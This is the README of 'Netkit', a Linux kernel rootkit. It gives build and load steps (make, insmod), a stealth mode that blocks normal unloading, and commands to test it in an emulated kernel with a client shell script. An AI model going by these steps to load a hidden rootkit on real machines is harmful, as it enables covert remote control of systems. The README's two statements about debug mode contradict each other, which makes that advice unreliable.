# Netkit

## Usage
To run the rootkit, optionally tweak it in the configurations, build it using `make` and ship it using `insmod`, or any other kernel module loader.

**==== Please make sure to adjust `CONFIG_NETKIT_DEBUG` to your liking ====**

If `CONFIG_NETKIT_DEBUG` is enabled, then stealth mode is enabled and the rootkit can only be stopped using the self destruct / exit cmd (not using rmmod).

```bash
git clone https://github.com/notselwyn/netkit/
cd netkit
make

ls -la netkit.ko
```

### Testing it with notselwyn/kernel-scripts

Since the rootkit was developed with the author's (kernel-scripts)[https://github.com/notselwyn/kernel-scripts], it's a breeze to debug and test. Simply download the scripts and compile a compatible Linux kernel.

To run the kernel:
```bash
cd netkit
create-image.sh
run.sh $KERNEL_PROJ_ROOT
```

To run the rootkit (make sure it's in debug mode to allow for `rmmod` in `run_kmod.sh`):
```bash
cd netkit
run_kmod.sh netkit.ko netkit
run_python.sh client/shell.py
```
